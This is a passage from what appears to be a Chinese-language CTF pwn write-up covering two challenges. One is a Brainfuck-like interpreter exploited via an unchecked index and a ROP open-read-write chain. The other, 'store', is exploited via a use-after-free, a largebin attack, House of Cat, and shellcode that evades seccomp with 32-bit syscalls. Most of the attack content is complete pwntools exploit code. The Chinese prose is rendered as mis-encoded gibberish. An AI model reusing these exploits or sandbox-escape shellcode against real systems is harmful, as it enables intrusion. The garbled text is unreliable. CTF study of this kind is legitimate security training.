class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = fd <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x25</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A &gt; <span class="number">0x1</span>) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>ÈôêÂà∂‰∫Ü <code>read</code>ÔºàÂÖ∂ÂÆû‰πü ban ‰∫Ü <code>execve</code>Ôºå‰ΩÜËøôÈáåÊ≤°ÊúâÊòæÁ§∫Ôºâ</li>
</ul>
<p><strong>ÊºèÊ¥ûÂàÜÊûê</strong></p>
<p>È¢òÁõÆÂ∞±ÊòØÊÉ≥Ê®°‰ªø Brainfuck ËØ≠Ë®Ä</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">char</span> buf[<span class="number">520</span>]; <span class="comment">// [rsp+10h] [rbp-210h] BYREF</span></span><br><span class="line">......</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">          write(<span class="number">1</span>, &amp;buf[i], <span class="number">1uLL</span>);</span><br><span class="line">          <span class="keyword">goto</span> <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">          buf[i] = getchar();</span><br></pre></td></tr></table></figure>
<ul>
<li>Ê≤°ÊúâÂØπ‚Äúi‚ÄùËøõË°åÈôêÂà∂</li>
<li>Âà©Áî® ‚Äú.‚Äù Âíå ‚Äú&gt;‚Äù ÁöÑÈÖçÂêàÂèØ‰ª•ÂÆûÁé∞ leak</li>
<li>Âà©Áî® ‚Äú,‚Äù Âíå ‚Äú&gt;‚Äù ÁöÑÈÖçÂêàÂèØ‰ª•Ë¶ÜÁõñ ret</li>
</ul>
<p><strong>ÂÖ•‰æµÊÄùË∑Ø</strong></p>
<p>Ê≥ÑÈú≤ÂÆåÊï¥‰πãÂêéÔºåÁõ¥Êé•Ë¶ÜÁõñËøîÂõûÂú∞ÂùÄ‰∏∫ ORW ÁöÑÂèòÁßç</p>
<p>ÂÆåÊï¥ expÔºö</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.51.221.205&#x27;</span>, <span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x18CD)\n&quot;</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&gt;&#x27;</span>*(<span class="number">512</span>+<span class="number">5</span>*<span class="number">8</span>) + <span class="string">b&#x27;.&gt;&#x27;</span> * <span class="number">7</span> + <span class="string">b&#x27;.&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;&gt;&#x27;</span>*(<span class="number">1</span>*<span class="number">8</span>) + <span class="string">b&#x27;.&gt;&#x27;</span> * <span class="number">7</span> + <span class="string">b&#x27;.&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;&lt;&#x27;</span>*(<span class="number">4</span>*<span class="number">8</span>-<span class="number">1</span>+<span class="number">7</span>)+<span class="string">b&#x27;,&gt;&#x27;</span>*<span class="number">0xb8</span> + <span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">heapbase = u64(p.recvuntil(<span class="string">b&#x27;\x56&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x2a0</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">log.success(<span class="string">&quot;heapbase: &quot;</span>+<span class="built_in">hex</span>(heapbase))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x24083</span></span><br><span class="line">log.success(<span class="string">&quot;libc.address: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">open_addr = libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">flag_addr = <span class="number">0x684</span>+heapbase</span><br><span class="line">pop_rax_ret=libc.address+<span class="number">0x0000000000036174</span></span><br><span class="line">pop_rdi_ret=libc.address+<span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi_ret=libc.address+<span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_ret=libc.address+<span class="number">0x0000000000142c92</span></span><br><span class="line">syscall_ret=libc.address+<span class="number">0x630a9</span></span><br><span class="line"></span><br><span class="line">payload =  p64(pop_rax_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(flag_addr)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(heapbase)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x30</span>) </span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;_exit&#x27;</span>]) </span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="store"><a href="#store" class="headerlink" title="store"></a>store</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">store: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.31</span><span class="number">-0u</span>buntu9_amd64/ld<span class="number">-2.31</span>.so, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=cd388e748e0640343faaa81f9d2a6fccd07ff729, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64‰ΩçÔºådynamicallyÔºåÂÖ®ÂºÄ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">‚ûú  store seccomp-tools dump ./store                </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0e</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0016</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x13</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0024</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x11</span> <span class="number">0x00</span> <span class="number">0x0000000c</span>  <span class="keyword">if</span> (A == brk) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x10</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x0f</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x0e</span> <span class="number">0x00</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A == fstat) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x0d</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x0c</span> <span class="number">0x00</span> <span class="number">0x0000003c</span>  <span class="keyword">if</span> (A == <span class="built_in">exit</span>) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x0b</span> <span class="number">0x00</span> <span class="number">0x0000005a</span>  <span class="keyword">if</span> (A == chmod) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x0a</span> <span class="number">0x00</span> <span class="number">0x0000008c</span>  <span class="keyword">if</span> (A == getpriority) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x0000008d</span>  <span class="keyword">if</span> (A == setpriority) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x000000c0</span>  <span class="keyword">if</span> (A == lgetxattr) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x08</span> <span class="number">0x000000e6</span>  <span class="keyword">if</span> (A == clock_nanosleep) <span class="keyword">goto</span> <span class="number">0023</span> <span class="keyword">else</span> <span class="keyword">goto</span> <span class="number">0024</span></span><br><span class="line"> <span class="number">0016</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x07</span> <span class="number">0x40000003</span>  <span class="keyword">if</span> (A != ARCH_I386) <span class="keyword">goto</span> <span class="number">0024</span></span><br><span class="line"> <span class="number">0017</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0018</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A == fstat) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0019</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x0000005a</span>  <span class="keyword">if</span> (A == chmod) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0020</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000008c</span>  <span class="keyword">if</span> (A == getpriority) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0021</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000008d</span>  <span class="keyword">if</span> (A == setpriority) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0022</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x000000c0</span>  <span class="keyword">if</span> (A != lgetxattr) <span class="keyword">goto</span> <span class="number">0024</span></span><br><span class="line"> <span class="number">0023</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0024</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<p><strong>ÊºèÊ¥ûÂàÜÊûê</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( free_num )                            </span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>((&amp;chunk_list)[index]);               <span class="comment">// UAF</span></span><br><span class="line">  --free_num;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;success!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>UAF</li>
</ul>
<p><strong>ÂÖ•‰æµÊÄùË∑Ø</strong></p>
<p>Êú¨È¢òÁõÆÁöÑÈôêÂà∂Â¶Ç‰∏ãÔºö</p>
<ul>
<li>Âè™ËÉΩÊéßÂà∂Áî≥ËØ∑ÁöÑÂ§¥‰∏§‰∏™ chunk</li>
<li>ÈôêÂà∂ÈáäÊîæÊ¨°Êï∞‰∏∫4Ê¨°</li>
</ul>
<p>ËôΩÁÑ∂Âè™ËÉΩÊéßÂà∂Áî≥ËØ∑ÁöÑÂ§¥‰∏§‰∏™ chunkÔºå‰ΩÜËøòÊòØÂèØ‰ª•ÂÆåÊàê largebin attack</p>
<p>‰∫éÊòØÊàë‰ª¨ÂÖàËøõË°åÊ≥ÑÈú≤ÔºåÁÑ∂ÂêéÁî® largebin attack Âä´ÊåÅ <code>_IO_list_all</code>ÔºåÊé•‰∏ãÊù•Êúâ‰∏§ÁßçÊÄùË∑ØÔºö</p>
<ul>
<li>house of cat</li>
<li>house of apple</li>
</ul>
<p><strong>House Of Cat</strong></p>
<p>house of cat ÁöÑÂ∏∏ËßÑË∞ÉÁî®Èìæ‰∏∫Ôºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysmalloc -&gt; __malloc_assert -&gt; __fxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt;  _IO_wfile_seekoff</span><br></pre></td></tr></table></figure>
<ul>
<li>‰Ωø top chunk ‰∏çË∂≥‰ª•Áî≥ËØ∑‰ªéËÄåË∞ÉÁî® <code>sysmalloc</code></li>
</ul>
<p>Áõ¥Êé•Ë∞ÉÁî® <code>exit</code> Âàô‰ºöËß¶ÂèëÂè¶‰∏ÄÊù°Ë∞ÉÁî®ÈìæÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__GI_exit -&gt; __run_exit_handlers -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_wfile_seekoff</span><br></pre></td></tr></table></figure>
<ul>
<li>Áõ¥Êé• <code>exit</code> Â∞±Â•ΩÔºå‰∏çÁî®Á†¥ÂùèÂ†ÜÁªìÊûÑ</li>
</ul>
<p>Âú®Êú¨È¢òÁõÆ‰∏≠ÈúÄË¶ÅÊ≥®ÊÑè‰∏§‰∏™ÈóÆÈ¢òÔºö</p>
<ul>
<li>Á®ãÂ∫èÁöÑÊ≤ôÁõíÁ¶ÅÊ≠¢‰∫Ü <code>open</code></li>
<li>‚Äúflag‚ÄùÊñá‰ª∂ÁöÑÂêçÁß∞Êú™Áü•</li>
</ul>
<p>ÂΩì‰∏çÁü•ÈÅìÁ®ãÂ∫èÂêçÁß∞Êó∂ÔºåÊàë‰ª¨ÈúÄË¶ÅÁî® <code>getdents</code> ËøõË°åÊìç‰ΩúÔºö</p>
<ul>
<li>ÂÖàÊâßË°å <code>open(&#39;.&#39;,0)</code> ÊâìÂºÄÂΩìÂâçÁõÆÂΩï</li>
<li>ÁÑ∂ÂêéÊâßË°å <code>getdents(3, buf, 0x200)</code></li>
</ul>
<p><code>open</code> Âíå <code>getdents</code> ÈÉΩË¢´ ban ‰∫ÜÔºå‰ΩÜÊòØÂØπÂ∫î32‰ΩçÁöÑ <code>open</code> Âíå <code>getdents</code> Ê≤°Êúâ ban</p>
<ul>
<li><code>sys_fstat-0x5</code> =&gt; <code>open-0x5</code></li>
<li><code>sys_setpriority-0x8D</code> =&gt; <code>getdents-0x8D</code></li>
</ul>
<p>Shellcode Â¶Ç‰∏ãÔºö</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0xc0</span></span><br><span class="line"><span class="string">    mov rbx, 0x500000</span></span><br><span class="line"><span class="string">    mov rcx, 0x5000</span></span><br><span class="line"><span class="string">    mov rdx, 3</span></span><br><span class="line"><span class="string">    mov rsi, 1048610</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    xor rbp, rbp</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0</span></span><br><span class="line"><span class="string">    mov rsi, 0x502000</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 5</span></span><br><span class="line"><span class="string">    mov rbx, 0x502000</span></span><br><span class="line"><span class="string">    xor rcx, rcx</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 0x8d</span></span><br><span class="line"><span class="string">    mov rbx, 3</span></span><br><span class="line"><span class="string">    mov rcx, 0x502000</span></span><br><span class="line"><span class="string">    mov rdx, 0x200</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    mov rsi ,0x502000</span></span><br><span class="line"><span class="string">    mov rdx ,0x200</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>ËøôÈáåÂÖà‰ΩøÁî®32‰ΩçÁöÑ <code>mmap2</code> Áî≥ËØ∑‰∏ÄÁâáÁ©∫Èó¥</li>
<li>‰ΩøÁî® <code>read</code> ËØªÂÖ•‚Äú.‚Äù</li>
<li>ÁÑ∂Âêé‰æùÊ¨°ÊâßË°å32‰ΩçÁöÑ <code>open</code> Âíå <code>getdents</code></li>
<li>ÊúÄÂêéÁî® <code>write</code> ÊâìÂç∞Âá∫Êù•</li>
</ul>
<p>ÊâæÂà∞ ‚Äúflag‚Äù Êñá‰ª∂‰ª•ÂêéÔºåÂØπ shellcode ‰øÆÊîπ‰∏Ä‰∏ãÂ∞±ÂèØ‰ª•‰∫Ü</p>
<p>ÂÆåÊï¥ expÔºö</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span 